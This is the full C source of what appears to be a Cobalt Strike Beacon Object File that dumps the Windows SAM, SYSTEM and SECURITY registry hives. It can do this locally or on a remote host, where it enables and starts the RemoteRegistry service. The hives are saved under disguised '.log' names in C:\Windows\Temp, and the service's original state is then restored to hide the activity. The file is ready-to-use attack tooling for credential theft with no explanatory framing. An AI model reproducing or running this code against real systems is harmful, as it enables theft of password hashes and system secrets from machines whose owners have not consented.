#include <windows.h>
#include "common.h"
#include "beacon.h"
#include <stdbool.h>


DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);

SC_HANDLE gscManager;
bool bRegSrvStop = false;
bool bRegSrvDisable = false;
bool localdump = false;

void EnableDebugPriv(LPCSTR priv)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;


	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed, Error = %u", KERNEL32$GetLastError());
		return;
	}

	if (ADVAPI32$LookupPrivilegeValueA(NULL, priv, &luid) == 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue() failed, Error = %u", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hToken);
		return;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges() failed, Error = %u", KERNEL32$GetLastError());
		return;
	}

	KERNEL32$CloseHandle(hToken);
}



bool StartRemoteRegSrv(char* hostname) {
	SERVICE_STATUS_PROCESS serviceStatus;
	DWORD junk = 0;
	DWORD cbBytesNeeded = 0;
	DWORD dwResult = ERROR_SUCCESS;
	LPQUERY_SERVICE_CONFIGA lpServiceConfig = NULL;
	SC_HANDLE scService = NULL;


	if ((gscManager = ADVAPI32$OpenSCManagerA(hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT | GENERIC_READ)) == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerA() failed, Error = %u", KERNEL32$GetLastError());
		return false;
	}
	
	if ((scService = ADVAPI32$OpenServiceA(gscManager, "RemoteRegistry", SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_STOP)) == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "OpenServiceA() failed, Error = %u", KERNEL32$GetLastError());
		return false;
	}
	
	if (!ADVAPI32$QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatus, sizeof(SERVICE_STATUS_PROCESS), &junk))
	{
		BeaconPrintf(CALLBACK_ERROR, "QueryServiceStatusEx() failed, Error = %u", KERNEL32$GetLastError());
		return false;
	}

	if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
		BeaconPrintf(CALLBACK_OUTPUT, "[!] RemoteRegistry service state: stopped");
		ADVAPI32$QueryServiceConfigA(scService, NULL, 0, &cbBytesNeeded);
		dwResult = KERNEL32$GetLastError();

		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			BeaconPrintf(CALLBACK_ERROR, "QueryServiceConfigA() failed, INSUFFICIENT_BUFFER, Error = %u\n", dwResult);
			return false;
		}
		if ((lpServiceConfig = (LPQUERY_SERVICE_CONFIGA)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbBytesNeeded)) == NULL)
		{
			BeaconPrintf(CALLBACK_ERROR, "HeapAlloc() failed");
			return false;
		}
		if (!ADVAPI32$QueryServiceConfigA(scService, lpServiceConfig, cbBytesNeeded, &cbBytesNeeded))
		{
			BeaconPrintf(CALLBACK_ERROR, "QueryServiceConfigA() failed, Error = %u", KERNEL32$GetLastError());
			return false;
		}


		if (lpServiceConfig->dwStartType == SERVICE_DISABLED) {
			BeaconPrintf(CALLBACK_OUTPUT, "[!] RemoteRegistry service type: disabled");

			if (ADVAPI32$ChangeServiceConfigA(scService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
				BeaconPrintf(CALLBACK_OUTPUT, "Successfully enable RemoteRegistry service");
				bRegSrvDisable = true;
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigA() failed, Error = %u", KERNEL32$GetLastError());
				return false;
			}
		}
		if (ADVAPI32$StartServiceA(scService, 0, NULL)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Successfully started RemoteRegistry service");
			bRegSrvStop = true;
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "Failed to start RemoteRegistry service, Error = %u", KERNEL32$GetLastError());
			return false;
		}
		ADVAPI32$CloseServiceHandle(scService);
		scService = NULL;

	}
	

	return true;
}



void StopRemoteRegSrv() {
	SC_HANDLE scService = NULL;

	if ((scService = ADVAPI32$OpenServiceA(gscManager, "RemoteRegistry", SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_STOP)) == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "OpenServiceA() failed, Error = %u", KERNEL32$GetLastError());
		return;
	}

	SERVICE_STATUS_PROCESS sStatus;
	if (bRegSrvDisable) {
		if (ADVAPI32$ChangeServiceConfigA(scService, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Successfully disabled RemoteRegistry service");
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfigA() failed, Error = %u", KERNEL32$GetLastError());
			return;
		}
	}
	if (bRegSrvStop) {
		if (ADVAPI32$ControlService(scService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&sStatus)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Successfully stopped RemoteRegistry service");
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "ControlService() failed, Error = %u", KERNEL32$GetLastError());
			return;
		}
	}
	ADVAPI32$CloseServiceHandle(scService);
	scService = NULL;

	return;
}

void ExportRegKey(char* hostname, LPCSTR subkey, LPCSTR outFile)
{
	HKEY hRemoteReg;
	HKEY hSubKey;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;

	if (!localdump) {
		if (!ADVAPI32$RegConnectRegistryA(hostname, HKEY_LOCAL_MACHINE, &hRemoteReg) == ERROR_SUCCESS) {
			BeaconPrintf(CALLBACK_ERROR, "Could not connect remote reg key HKLM\\%s on %s, Error = %u", subkey, hostname, KERNEL32$GetLastError());
			return;
		}
		if (ADVAPI32$RegOpenKeyExA(hRemoteReg, subkey, 0, KEY_ALL_ACCESS, &hSubKey) != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not open key HKLM\\%s on %s, Error = %u", subkey, hostname, KERNEL32$GetLastError());
			return;
		}
	}
	else {
		if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS, &hSubKey) != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "Could not open key HKLM\\%s, Error = %u", subkey, KERNEL32$GetLastError());
			return;
		}
	}

	if (ADVAPI32$RegSaveKeyA(hSubKey, outFile, lpSecurityAttributes) == ERROR_SUCCESS)
	{
		if (localdump) {
			BeaconPrintf(CALLBACK_OUTPUT, "Exported HKLM\\%s at %s", subkey, outFile);
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "Exported HKLM\\%s at %s on %s", subkey, outFile, hostname);
		}
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "RegSaveKey failed on HKLM\\%s, Error = %u", subkey, KERNEL32$GetLastError());
	}

	ADVAPI32$RegCloseKey(hSubKey);
	
}

void go(char* args, int alen)
{

	localdump = false;
	bRegSrvStop = false;
	bRegSrvDisable = false;

	datap parser;

	char buffer_1[MAX_PATH] = "";
	char* lpStr1;
	lpStr1 = buffer_1;

	char buffer_sam[] = "HG029SAM.log";
	char* lpStrsam;
	lpStrsam = buffer_sam;

	char buffer_sys[] = "HG029SYS.log";
	char* lpStrsys;
	lpStrsys = buffer_sys;

	char buffer_sec[] = "HG029SEC.log";
	char* lpStrsec;
	lpStrsec = buffer_sec;


	BeaconDataParse(&parser, args, alen);
	char* dir = BeaconDataExtract(&parser, NULL);
	char* hostname = BeaconDataExtract(&parser, NULL);
	
	if (hostname[0] == '\0') {
		localdump = true;
	}
	if (dir[0] == '\0') {
		dir = "C:\\Windows\\Temp";
	}

	if (localdump) {
		if (!BeaconIsAdmin()) {
			BeaconPrintf(CALLBACK_ERROR, "Local admin privileges required!");
			return;
		}
		EnableDebugPriv(SE_DEBUG_NAME);
		EnableDebugPriv(SE_RESTORE_NAME);
		EnableDebugPriv(SE_BACKUP_NAME);
	}
	else {
		if (!StartRemoteRegSrv(hostname)) {
			ADVAPI32$CloseServiceHandle(gscManager);
			gscManager = NULL;
			return;
		}
	}

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsys);
	ExportRegKey(hostname, "SYSTEM", lpStr1);

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsam);
	ExportRegKey(hostname, "SAM", lpStr1);

	SHLWAPI$PathCombineA(lpStr1, dir, lpStrsec);
	ExportRegKey(hostname, "SECURITY", lpStr1);
	
	if (!localdump) {
		StopRemoteRegSrv();
		ADVAPI32$CloseServiceHandle(gscManager);
		gscManager = NULL;
	}
	
};